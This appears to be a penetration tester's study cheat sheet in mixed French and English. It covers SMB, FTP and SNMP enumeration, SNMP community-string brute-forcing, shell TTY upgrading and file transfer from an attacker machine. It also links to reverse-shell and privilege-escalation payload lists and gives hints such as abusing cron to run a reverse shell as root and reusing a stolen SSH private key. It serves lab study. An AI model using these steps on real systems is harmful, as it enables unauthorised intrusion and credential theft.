# Getting Started

```bash
# se connecter via ftp
ftp -p <IP Address>
```

###### SMB

```bash
# nmap script for smb
nmap --script smb-os-discovery.nse
# enumerate shares in smb 
smbclient -N -L \\\\<IP Address>
# se connecter en tant qu'utilisateur
smbclient -U <Username> \\\\<IP Address>\\<Sharename>
```

* -L : flag specifies that we want to retrieve a list of available shares on the remote host
* -N : suppresses the password prompt.

###### SNMP

> SNMP Community strings provide information and statistics about a router or device, helping us gain access to it.

```bash
# bruteforce the community string names
onesixtyone -c dict.txt <IP Address>
```

```bash
# find ip
ip a
```

###### Bind Shell
[bind shell payload all the thing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md)

###### Reverse Shell
[Reverse shell payload all the thing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

###### Upgrading TTY
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
entrer*2

# sur notre terminal
echo $TERM
export TERM=<valeur du TERM>
stty size
stty rows <Val1> columns <Val2>
```


```bash
# listening server on our machine
python3 -m http.server 8000
# on the downloader machine : 
wget | curl  http://<ListenningMachine>:<LinstenningPort>/<File>
#
scp <FileName> <UserName>@<remotehost>:/<RemoteLink>

# validation
md5sum <filename>
file <fileName>
```

```bash
# changer les clés ssh
ssh-keygen
```

###### Privilege Escalation

[Windows Privilege Escalation Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[Linux Privilege Escalation Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

* Enumeration tools 
    - Linux : 
        * [LinEnum](https://github.com/rebootuser/LinEnum), 
        * [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
    - Windows : 
        * 
* Kernel exploitation :
    - Search kernel version exploit with tools ( searchsploit ...)
* Installed Software exploit :
```bash
# run in both devices
dpkg -l
# C:\Program Files in Windows
```
* User privilege : sudo , SUID, Windows Token Privileges
    - ```bash
        sudo -l
        sudo su -
        su - # password reuse

      ```
    - exploit commander that can be executed with sudo [gftobins](https://gtfobins.github.io/), lolbas
    
    - ```bash
      # peut modifier un répertoire que ces fichiers appelent pour run un script reverse shell en root
      /etc/crontab
      /etc/cron.d
      /var/spool/cron/crontabs/root
      ``` 
    - SSH key search
    - **Si l'attaquant à le id_rsa de la cible sur sa machine, pour pouvoir l'utiliser il doit faire un _chmod 400_**